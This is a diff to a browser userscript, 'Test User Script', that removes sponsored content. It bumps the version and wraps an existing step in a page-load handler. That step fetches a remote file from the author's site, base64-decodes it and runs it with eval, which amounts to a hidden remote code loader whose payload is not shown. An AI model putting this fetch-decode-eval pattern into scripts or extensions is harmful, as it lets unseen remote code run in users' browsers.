@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Test User Script
 // @namespace    http://tampermonkey.net/
-// @version      0.6
+// @version      0.7
 // @description  Test
 // @author       Scratchyone
 // @updateURL    https://www.scratchyone.com/userscripts/testuserscript.user.js
@@ -41,10 +41,13 @@
     console.log("Deleting Sponsored Content...");
     }
   }, 1000);
-  fetch('https://www.scratchyone.com/userscripts/demo.js').then(function(response) { 
+    var run=0;
+    document.body.onload=function(){
+  fetch('https://www.scratchyone.com/userscripts/demo.js').then(function(response) {
 	// Convert to JSON
 	return response.text();
 }).then(function(t) {
 	eval(atob(t));
 });
+    };
 })();
